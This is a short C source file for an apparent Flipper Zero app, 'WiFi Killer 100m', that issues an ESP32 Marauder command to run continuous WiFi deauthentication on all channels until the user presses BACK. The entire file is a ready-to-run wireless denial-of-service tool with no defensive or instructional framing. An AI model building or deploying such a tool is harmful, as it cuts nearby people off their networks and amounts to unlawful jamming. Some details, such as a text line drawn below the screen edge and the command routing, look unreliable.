#include <furi.h>
#include <gui/gui.h>
#include <input/input.h>
#include <cli/cli.h>

static bool running = true;

static void input_callback(InputEvent* input, void* ctx) {
    UNUSED(ctx);
    if(input->type == InputTypePress && input->key == InputKeyBack) {
        running = false;
    }
}

static void draw_callback(Canvas* canvas, void* ctx) {
    UNUSED(ctx);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 5, 20, "WiFi Killer 100m");
    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 5, 40, "CONTINUOUS DEAUTH");
    canvas_draw_str(canvas, 5, 55, "Press BACK to stop");
    canvas_draw_str(canvas, 5, 70, "ESP32-S2: ACTIVE");
}

// Launch continuous deauth via Marauder CLI
static void launch_continuous_deauth() {
    Cli* cli = furi_record_open(RECORD_CLI);
    if(!cli) return;
    
    // Start continuous deauth on all channels
    cli_write(cli, (uint8_t*)"marauder deauth -a -c all -l\r\n", 31);
    furi_delay_ms(200);
    
    furi_record_close(RECORD_CLI);
}

// Stop deauth
static void stop_deauth() {
    Cli* cli = furi_record_open(RECORD_CLI);
    if(!cli) return;
    
    cli_write(cli, (uint8_t*)"marauder deauth -s\r\n", 21); // stop
    furi_delay_ms(100);
    
    furi_record_close(RECORD_CLI);
}

int32_t wifi_killer_app(void* p) {
    UNUSED(p);
    
    // GUI
    ViewPort* view_port = view_port_alloc();
    view_port_draw_callback_set(view_port, draw_callback, NULL);
    view_port_input_callback_set(view_port, input_callback, NULL);
    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);
    
    // Start continuous deauth
    launch_continuous_deauth();
    
    // Main loop - keep running until BACK pressed
    while(running) {
        furi_delay_ms(50);
    }
    
    // Stop deauth on exit
    stop_deauth();
    
    // Cleanup
    gui_remove_view_port(gui, view_port);
    view_port_free(view_port);
    furi_record_close(RECORD_GUI);
    
    return 0;
}
